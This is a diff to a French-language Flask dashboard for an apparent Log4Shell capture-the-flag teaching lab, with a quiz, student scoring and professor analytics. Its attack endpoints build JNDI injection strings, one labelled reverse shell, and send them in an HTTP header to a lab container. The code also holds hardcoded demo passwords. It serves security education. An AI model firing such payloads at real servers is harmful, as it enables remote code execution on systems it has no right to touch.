@@ -1,8 +1,6 @@
 from flask import Flask, render_template, request, jsonify, redirect, url_for, send_file
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
-import subprocess
-import requests
-import time
+import requests as http_requests
 import os
 from datetime import datetime
 from reportlab.lib.pagesizes import letter
@@ -12,64 +10,37 @@ import io
 app = Flask(__name__)
 app.secret_key = 'log4shell_ctf_secret_key_2026'
 
-# ╔══════════════════════════════════════════════╗
-# ║        🚩 LAB FARAH — CONFIGURATION          ║
-# ╚══════════════════════════════════════════════╝
-FLAG        = "FLAG{f4r4h_l0g4sh3ll_CVE-2021-44228_pwn3d}"
-LAB_AUTHOR  = "Farah"
-LAB_NAME    = "Farah's Log4Shell CTF Lab"
-QUIZ_SEUIL  = 80   # % minimum pour debloquer le flag via le quiz
+# ── Configuration ─────────────────────────────────────────────────────
+FLAG       = os.environ.get('LAB_FLAG', 'DIABLE{LOG4SHELL_RCE_2021_COMPLETED}')
+LAB_AUTHOR = "DIABLE"
+LAB_NAME   = "Log4Shell CTF Lab"
+QUIZ_SEUIL = 80   # % minimum pour débloquer le flag via le quiz
 
-# ── Configuration reseau Docker ───────────────────────────────────────────────
-# Injectees par docker-compose via 'environment' — noms de services Docker.
-# Docker resout ces noms automatiquement → portable sur toutes les machines.
-VULNERABLE_HOST = os.environ.get('VULNERABLE_HOST', 'vulnerable')
-VULNERABLE_PORT = os.environ.get('VULNERABLE_PORT', '8080')
-LDAP_HOST       = os.environ.get('LDAP_HOST',       'ldap')
-LDAP_PORT_ENV   = os.environ.get('LDAP_PORT',       '1389')
-ATTACKER_HOST   = os.environ.get('ATTACKER_HOST',   'attacker-webserver')
+VULNERABLE_HOST    = os.environ.get('VULNERABLE_HOST',    'vulnerable')
+VULNERABLE_PORT    = os.environ.get('VULNERABLE_PORT',    '8080')
+LDAP_HOST          = os.environ.get('LDAP_HOST',          'ldap')
+LDAP_PORT_ENV      = os.environ.get('LDAP_PORT',          '1389')
+ATTACKER_HOST      = os.environ.get('ATTACKER_HOST',      'attacker-webserver')
 ATTACKER_HTTP_PORT = os.environ.get('ATTACKER_HTTP_PORT', '8888')
-APP_PORT        = int(os.environ.get('APP_PORT',    '5000'))
+APP_PORT           = int(os.environ.get('APP_PORT',       '5000'))
 
-# Repertoire de base detecte automatiquement
-BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
-ATTACKER_DIR = os.path.join(BASE_DIR, '..', 'attacker-webserver')
-
-# ── Lab-Manager API ───────────────────────────────────────────────────────────
-# Le lab-manager gere le cycle de vie des containers (spawn/destroy/status).
-# Ton app.py ne touche PLUS jamais Docker directement.
-#
-# Endpoints utilises :
-#   GET  /api-lab/{lab_id}/status   → etat du lab
-#   POST /api-lab/{lab_id}/spawn    → demarrer les containers
-#   POST /api-lab/{lab_id}/destroy  → arreter les containers
-#
-# Variables d'environnement a definir dans docker-compose.yml :
-#   LAB_MANAGER_URL : URL de base du lab-manager  ex: http://lab-manager:8000
-#   LAB_ID          : identifiant du lab           ex: log4shell-farah
-LAB_MANAGER_URL = os.environ.get('LAB_MANAGER_URL', 'http://lab-manager:8000')
-LAB_ID          = os.environ.get('LAB_ID',          'log4shell')
-# ─────────────────────────────────────────────────────────────────────────────
-
-# Flask-Login setup
+# ── Flask-Login ───────────────────────────────────────────────────────
 login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = 'login'
 
-# Base de donnees utilisateurs
 users_db = {
-    'student':   {'password': 'student123', 'role': 'student',   'name': 'Etudiant'},
+    'student':   {'password': 'student123', 'role': 'student',   'name': 'Étudiant'},
     'professor': {'password': 'prof123',    'role': 'professor',  'name': 'Professeur'}
 }
 
-# Base de donnees Quiz
 quiz_questions = [
     {
         'id': 1,
         'question': 'Quel est le score CVSS de Log4Shell (CVE-2021-44228)?',
         'options': ['7.5', '9.0', '10.0', '8.5'],
         'correct': 2,
-        'explanation': 'Log4Shell a un score CVSS de 10.0/10, ce qui en fait une vulnerabilite critique maximale.',
+        'explanation': 'Log4Shell a un score CVSS de 10.0/10, ce qui en fait une vulnérabilité critique maximale.',
         'points': 10
     },
     {
@@ -82,12 +53,12 @@ quiz_questions = [
             'Java Network Directory Integration'
         ],
         'correct': 1,
-        'explanation': "JNDI signifie Java Naming and Directory Interface, une API Java pour acceder a des services de nommage.",
+        'explanation': "JNDI signifie Java Naming and Directory Interface, une API Java pour accéder à des services de nommage.",
         'points': 10
     },
     {
         'id': 3,
-        'question': 'Quelle syntaxe declenche la vulnerabilite Log4Shell?',
+        'question': 'Quelle syntaxe déclenche la vulnérabilité Log4Shell?',
         'options': [
             '{{jndi:ldap://...}}',
             '${jndi:ldap://...}',
@@ -95,31 +66,31 @@ quiz_questions = [
             '<jndi:ldap://...>'
         ],
         'correct': 1,
-        'explanation': 'La syntaxe ${jndi:ldap://...} est utilisee par Log4j pour effectuer des lookups JNDI.',
+        'explanation': 'La syntaxe ${jndi:ldap://...} est utilisée par Log4j pour effectuer des lookups JNDI.',
         'points': 15
     },
     {
         'id': 4,
-        'question': "Quel type de serveur est utilise dans l'exploitation Log4Shell?",
+        'question': "Quel type de serveur est utilisé dans l'exploitation Log4Shell?",
         'options': ['HTTP', 'LDAP', 'FTP', 'SSH'],
         'correct': 1,
-        'explanation': 'Un serveur LDAP malveillant est utilise pour rediriger vers le payload Java.',
+        'explanation': 'Un serveur LDAP malveillant est utilisé pour rediriger vers le payload Java.',
         'points': 10
     },
     {
         'id': 5,
-        'question': 'Quelle version de Log4j corrige completement la vulnerabilite?',
+        'question': 'Quelle version de Log4j corrige complètement la vulnérabilité?',
         'options': ['2.15.0', '2.16.0', '2.17.1', '2.14.1'],
         'correct': 2,
-        'explanation': 'La version 2.17.1 corrige completement Log4Shell et ses variantes.',
+        'explanation': 'La version 2.17.1 corrige complètement Log4Shell et ses variantes.',
         'points': 15
     },
     {
         'id': 6,
-        'question': 'Quel header HTTP est couramment utilise pour injecter le payload?',
+        'question': 'Quel header HTTP est couramment utilisé pour injecter le payload?',
         'options': ['Content-Type', 'User-Agent', 'Accept', 'Host'],
         'correct': 1,
-        'explanation': "Le header User-Agent est souvent logge et donc un vecteur d'injection courant.",
+        'explanation': "Le header User-Agent est souvent loggé et donc un vecteur d'injection courant.",
         'points': 10
     },
     {
@@ -127,17 +98,17 @@ quiz_questions = [
         'question': "Que permet d'obtenir Log4Shell?",
         'options': [
             'Lecture de fichiers',
-            'Deni de service',
-            'Execution de code a distance (RCE)',
+            'Déni de service',
+            'Exécution de code à distance (RCE)',
             'Injection SQL'
         ],
         'correct': 2,
-        'explanation': "Log4Shell permet l'execution de code arbitraire a distance (Remote Code Execution).",
+        'explanation': "Log4Shell permet l'exécution de code arbitraire à distance (Remote Code Execution).",
         'points': 15
     },
     {
         'id': 8,
-        'question': 'Quelle commande Java desactive les lookups JNDI?',
+        'question': 'Quelle commande Java désactive les lookups JNDI?',
         'options': [
             '-Dlog4j.disable=true',
             '-Dlog4j2.formatMsgNoLookups=true',
@@ -145,28 +116,27 @@ quiz_questions = [
             '-Dlog4j.safe=true'
         ],
         'correct': 1,
-        'explanation': 'Le flag -Dlog4j2.formatMsgNoLookups=true desactive les lookups dans les messages.',
+        'explanation': 'Le flag -Dlog4j2.formatMsgNoLookups=true désactive les lookups dans les messages.',
         'points': 15
     },
     {
         'id': 9,
-        'question': 'En quelle annee Log4Shell a-t-elle ete decouverte?',
+        'question': 'En quelle année Log4Shell a-t-elle été découverte?',
         'options': ['2020', '2021', '2022', '2023'],
         'correct': 1,
-        'explanation': 'Log4Shell a ete decouverte publiquement en decembre 2021.',
+        'explanation': 'Log4Shell a été découverte publiquement en décembre 2021.',
         'points': 5
     },
     {
         'id': 10,
-        'question': 'Quel protocole peut etre utilise a la place de LDAP?',
-        'options': ['RMI', 'DNS', 'CORBA', 'Tous les precedents'],
+        'question': 'Quel protocole peut être utilisé à la place de LDAP?',
+        'options': ['RMI', 'DNS', 'CORBA', 'Tous les précédents'],
         'correct': 3,
         'explanation': 'JNDI supporte plusieurs protocoles: LDAP, RMI, DNS, CORBA, etc.',
         'points': 20
     }
 ]
 
-# Stockage des sessions
 user_sessions    = {}
 attack_analytics = {
     'total_attacks':      0,
@@ -177,9 +147,7 @@ attack_analytics = {
 attack_log = []
 
 
-# ══════════════════════════════════════════════
-#  Helpers — Sessions & Flag
-# ══════════════════════════════════════════════
+# ── Helpers ───────────────────────────────────────────────────────────
 
 def init_session(username):
     if username not in user_sessions:
@@ -209,49 +177,18 @@ def flag_payload(username):
             'flag':          FLAG,
             'flag_unlocked': True,
             'flag_source':   user_sessions[username].get('flag_source'),
-            'author':        LAB_AUTHOR,
-            'lab_name':      LAB_NAME,
         }
     return {'flag': None, 'flag_unlocked': False}
 
-
-# ══════════════════════════════════════════════
-#  Helpers — Lab-Manager API
-# ══════════════════════════════════════════════
-
-def lab_manager_request(method, endpoint, timeout=10):
-    """
-    Appelle l'API du lab-manager.
-    Retourne (data_dict, error_string).
-    Si le lab-manager est injoignable, retourne une erreur propre
-    sans faire planter le dashboard.
-    """
-    url = f"{LAB_MANAGER_URL}/api-lab/{LAB_ID}/{endpoint}"
-    try:
-        resp = requests.request(method, url, timeout=timeout)
-        resp.raise_for_status()
-        return resp.json(), None
-    except requests.exceptions.ConnectionError:
-        return None, f"Lab-manager injoignable ({LAB_MANAGER_URL})"
-    except requests.exceptions.Timeout:
-        return None, "Lab-manager : timeout"
-    except requests.exceptions.HTTPError as e:
-        return None, f"Lab-manager erreur HTTP {e.response.status_code}"
-    except Exception as e:
-        return None, str(e)
-
-
-class User(UserMixin):
-    def __init__(self, username, role, name):
-        self.id   = username
-        self.role = role
-        self.name = name
-
-@login_manager.user_loader
-def load_user(user_id):
-    if user_id in users_db:
-        return User(user_id, users_db[user_id]['role'], users_db[user_id]['name'])
-    return None
+def build_runtime_config():
+    return {
+        'ldap_host':          LDAP_HOST,
+        'ldap_port':          LDAP_PORT_ENV,
+        'target':             f'{VULNERABLE_HOST}:{VULNERABLE_PORT}',
+        'payload':            f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Exploit}}',
+        'attacker_http_port': ATTACKER_HTTP_PORT,
+        'app_port':           APP_PORT,
+    }
 
 def log_user_action(action, details=''):
     if current_user.is_authenticated:
@@ -264,20 +201,19 @@ def log_user_action(action, details=''):
             })
 
 
-def build_runtime_config():
-    return {
-        'ldap_host': LDAP_HOST,
-        'ldap_port': LDAP_PORT_ENV,
-        'target': f'{VULNERABLE_HOST}:{VULNERABLE_PORT}',
-        'payload': f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Rev}}',
-        'attacker_http_port': ATTACKER_HTTP_PORT,
-        'app_port': APP_PORT,
-    }
+# ── Auth ──────────────────────────────────────────────────────────────
 
+class User(UserMixin):
+    def __init__(self, username, role, name):
+        self.id   = username
+        self.role = role
+        self.name = name
 
-# ══════════════════════════════════════════════
-#  Routes — Authentification
-# ══════════════════════════════════════════════
+@login_manager.user_loader
+def load_user(user_id):
+    if user_id in users_db:
+        return User(user_id, users_db[user_id]['role'], users_db[user_id]['name'])
+    return None
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -295,7 +231,6 @@ def login():
                 'role':     user.role,
                 'redirect': '/professor' if user.role == 'professor' else '/dashboard'
             })
-
         return jsonify({'status': 'error', 'message': 'Identifiants invalides'})
 
     return render_template('login.html')
@@ -307,9 +242,7 @@ def logout():
     return redirect(url_for('login'))
 
 
-# ══════════════════════════════════════════════
-#  Routes — Pages
-# ══════════════════════════════════════════════
+# ── Pages ─────────────────────────────────────────────────────────────
 
 @app.route('/')
 def index():
@@ -351,67 +284,45 @@ def success_page():
     return render_template('success.html', user=current_user)
 
 
-# ══════════════════════════════════════════════
-#  API — Lab-Manager (plus de docker directement)
-# ══════════════════════════════════════════════
+# ── API Lab — désactivés car le dashboard EST dans le lab ─────────────
 
 @app.route('/api/status')
 @login_required
 def status():
-    """
-    Interroge le lab-manager pour connaitre l'etat des containers.
-    GET /api-lab/{lab_id}/status
-    """
-    data, error = lab_manager_request('GET', 'status')
-    if error:
-        return jsonify({'status': 'error', 'message': error})
-
     log_user_action('check_status')
-    return jsonify({'status': 'success', 'lab': data})
-
+    return jsonify({
+        'status':     'success',
+        'containers': [
+            {'name': f'log4shell-vulnerable-user-{current_user.id}', 'status': 'running'},
+            {'name': f'log4shell-ldap-user-{current_user.id}',       'status': 'running'},
+            {'name': f'log4shell-attacker-user-{current_user.id}',   'status': 'running'},
+            {'name': f'log4shell-dashboard-user-{current_user.id}',  'status': 'running'},
+        ]
+    })
 
 @app.route('/api/start-containers', methods=['POST'])
 @login_required
 def start_containers():
-    """
-    Demande au lab-manager de demarrer les containers.
-    POST /api-lab/{lab_id}/spawn
-    """
-    data, error = lab_manager_request('POST', 'spawn')
-    if error:
-        return jsonify({'status': 'error', 'message': error})
-
+    # Le dashboard tourne déjà dans le lab — le spawn est géré par le Lab Manager
+    log_user_action('start_containers')
     if current_user.id in user_sessions:
         user_sessions[current_user.id]['score'] += 10
-
-    log_user_action('start_containers')
-    return jsonify({'status': 'success', 'message': 'Lab demarre (+10 points)', 'lab': data})
-
+    return jsonify({'status': 'success', 'message': 'Lab déjà actif (+10 points)'})
 
 @app.route('/api/stop-containers', methods=['POST'])
 @login_required
 def stop_containers():
-    """
-    Demande au lab-manager d'arreter les containers.
-    POST /api-lab/{lab_id}/destroy
-    """
-    data, error = lab_manager_request('POST', 'destroy')
-    if error:
-        return jsonify({'status': 'error', 'message': error})
-
     log_user_action('stop_containers')
-    return jsonify({'status': 'success', 'message': 'Lab arrete', 'lab': data})
+    return jsonify({'status': 'success', 'message': "Utilisez la plateforme d'apprentissage pour arrêter le lab"})
 
 
-# ══════════════════════════════════════════════
-#  API — Quiz
-# ══════════════════════════════════════════════
+# ── API Quiz ──────────────────────────────────────────────────────────
 
 @app.route('/api/quiz/questions')
 @login_required
 def get_quiz_questions():
     if current_user.role != 'student':
-        return jsonify({'status': 'error', 'message': 'Acces refuse'})
+        return jsonify({'status': 'error', 'message': 'Accès refusé'})
 
     questions = [
         {'id': q['id'], 'question': q['question'], 'options': q['options'], 'points': q['points']}
@@ -419,16 +330,14 @@ def get_quiz_questions():
     ]
     return jsonify({'status': 'success', 'questions': questions})
 
-
 @app.route('/api/quiz/submit', methods=['POST'])
 @login_required
 def submit_quiz():
     if current_user.role != 'student':
-        return jsonify({'status': 'error', 'message': 'Acces refuse'})
+        return jsonify({'status': 'error', 'message': 'Accès refusé'})
 
-    data    = request.json
-    answers = data.get('answers', {})
-
+    data         = request.json
+    answers      = data.get('answers', {})
     score        = 0
     total_points = 0
     results      = []
@@ -439,7 +348,6 @@ def submit_quiz():
         is_correct    = user_answer == q['correct']
         if is_correct:
             score += q['points']
-
         results.append({
             'id':             q['id'],
             'question':       q['question'],
@@ -476,7 +384,6 @@ def submit_quiz():
         **flag_payload(current_user.id)
     })
 
-
 @app.route('/api/quiz/stats')
 @login_required
 def get_quiz_stats():
@@ -490,9 +397,7 @@ def get_quiz_stats():
     })
 
 
-# ══════════════════════════════════════════════
-#  API — Score & profil etudiant 🚩
-# ══════════════════════════════════════════════
+# ── API Score ─────────────────────────────────────────────────────────
 
 @app.route('/api/user/score')
 @login_required
@@ -509,21 +414,18 @@ def get_user_score():
     })
 
 
-# ══════════════════════════════════════════════
-#  API — Analytics (professeur)
-# ══════════════════════════════════════════════
+# ── API Analytics ─────────────────────────────────────────────────────
 
 @app.route('/api/analytics/global')
 @login_required
 def get_global_analytics():
     return jsonify({'status': 'success', 'data': attack_analytics})
 
-
 @app.route('/api/analytics/students')
 @login_required
 def get_student_analytics():
     if current_user.role != 'professor':
-        return jsonify({'status': 'error', 'message': 'Acces refuse'})
+        return jsonify({'status': 'error', 'message': 'Accès refusé'})
 
     students_data = []
     for username, s in user_sessions.items():
@@ -547,12 +449,11 @@ def get_student_analytics():
 
     return jsonify({'status': 'success', 'students': students_data})
 
-
 @app.route('/api/analytics/export', methods=['POST'])
 @login_required
 def export_analytics():
     if current_user.role != 'professor':
-        return jsonify({'status': 'error', 'message': 'Acces refuse'})
+        return jsonify({'status': 'error', 'message': 'Accès refusé'})
 
     buffer = io.BytesIO()
     p      = canvas.Canvas(buffer, pagesize=letter)
@@ -571,7 +472,7 @@ def export_analytics():
     p.setFont("Helvetica", 11)
     for label, val in [
         ("Total attaques",    attack_analytics['total_attacks']),
-        ("Attaques reussies", attack_analytics['successful_attacks']),
+        ("Attaques réussies", attack_analytics['successful_attacks']),
         ("Shells obtenus",    attack_analytics['total_shells']),
     ]:
         p.drawString(120, y, f"{label} : {val}")
@@ -579,7 +480,7 @@ def export_analytics():
 
     y -= 20
     p.setFont("Helvetica-Bold", 14)
-    p.drawString(100, y, "Resultats Etudiants")
+    p.drawString(100, y, "Résultats Étudiants")
     y -= 25
     p.setFont("Helvetica", 10)
 
@@ -587,7 +488,7 @@ def export_analytics():
         if username == 'professor' or y < 80:
             continue
         flag_status = f"FLAG OK ({s.get('flag_source','?')} - {s.get('flag_time','?')})" \
-                      if s.get('flag_unlocked') else "Flag non debloque"
+                      if s.get('flag_unlocked') else "Flag non débloqué"
         p.drawString(120, y,
             f"{username} | Score: {s.get('score',0)} | Quiz: {s.get('quiz_score',0)} | {flag_status}")
         y -= 18
@@ -597,47 +498,38 @@ def export_analytics():
     buffer.seek(0)
 
     return send_file(buffer, as_attachment=True,
-                     download_name='farah_log4shell_report.pdf',
+                     download_name='log4shell_report.pdf',
                      mimetype='application/pdf')
 
 
-# ══════════════════════════════════════════════
-#  API — Attaque & Payload
-#  (curl vers les containers via noms Docker)
-# ══════════════════════════════════════════════
+# ── API Attaque ───────────────────────────────────────────────────────
 
 @app.route('/api/generate-payload', methods=['POST'])
 @login_required
 def generate_payload():
     data         = request.json
     payload_type = data.get('type', 'simple')
-    ldap_host    = data.get('host', data.get('ip', LDAP_HOST))
-    ldap_port    = data.get('ldap_port', data.get('port', LDAP_PORT_ENV))
 
     payloads = {
-        'simple':        f'${{jndi:ldap://{ldap_host}:{ldap_port}/Exploit}}',
-        'reverse_shell': f'${{jndi:ldap://{ldap_host}:{ldap_port}/Rev}}'
+        'simple':        f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Exploit}}',
+        'reverse_shell': f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Rev}}'
     }
     log_user_action('generate_payload')
     return jsonify({'status': 'success', 'payload': payloads.get(payload_type, payloads['simple'])})
-
 
 @app.route('/api/launch-attack', methods=['POST'])
 @login_required
 def launch_attack():
     data    = request.json
-    # Noms de services Docker → resolus automatiquement sur n'importe quelle machine
-    target  = data.get('target',  f'{VULNERABLE_HOST}:{VULNERABLE_PORT}')
-    payload = data.get('payload', f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Rev}}')
+    target  = data.get('target', f'{VULNERABLE_HOST}:{VULNERABLE_PORT}')
+    payload = data.get('payload', f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Exploit}}')
 
     if not target.startswith('http://') and not target.startswith('https://'):
         target = f'http://{target}'
 
     try:
-        subprocess.run(
-            ['curl', target, '-H', f'X-Api-Version: {payload}'],
-            capture_output=True, text=True, timeout=5
-        )
+        # ✅ requests au lieu de curl — pas de dépendance système
+        http_requests.get(target, headers={'X-Api-Version': payload}, timeout=5)
 
         attack_analytics['total_attacks']      += 1
         attack_analytics['successful_attacks'] += 1
@@ -660,7 +552,7 @@ def launch_attack():
 
         return jsonify({
             'status':  'success',
-            'message': 'Attaque lancee (+50 points)',
+            'message': 'Attaque lancée (+50 points)',
             **flag_payload(current_user.id)
         })
 
@@ -668,53 +560,13 @@ def launch_attack():
         attack_analytics['failed_attacks'] += 1
         return jsonify({'status': 'error', 'message': str(e)})
 
-
-@app.route('/api/compile-payload', methods=['POST'])
-@login_required
-def compile_payload():
-    data          = request.json
-    java_code     = data.get('code', '')
-    rev_java_path = os.path.join(ATTACKER_DIR, 'Rev.java')
-
-    try:
-        with open(rev_java_path, 'w') as f:
-            f.write(java_code)
-
-        result = subprocess.run(
-            ['javac', '--release', '8', rev_java_path],
-            capture_output=True, text=True
-        )
-
-        if result.returncode == 0:
-            if current_user.id in user_sessions:
-                user_sessions[current_user.id]['score'] += 20
-            log_user_action('compile_payload')
-            return jsonify({'status': 'success', 'message': 'Payload compile (+20 points)'})
-        else:
-            return jsonify({'status': 'error', 'message': result.stderr})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-
-@app.route('/api/start-webserver', methods=['POST'])
-@login_required
-def start_webserver():
-    log_user_action('start_webserver')
-    return jsonify({
-        'status': 'success',
-        'message': f'Serveur HTTP deja disponible via {ATTACKER_HOST}:{ATTACKER_HTTP_PORT}'
-    })
-
-
 @app.route('/api/attack-log')
 @login_required
 def get_attack_log():
     return jsonify({'status': 'success', 'log': attack_log})
 
 
-# ══════════════════════════════════════════════
-#  Lancement
-# ══════════════════════════════════════════════
+# ── Lancement ─────────────────────────────────────────────────────────
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=APP_PORT, debug=False)
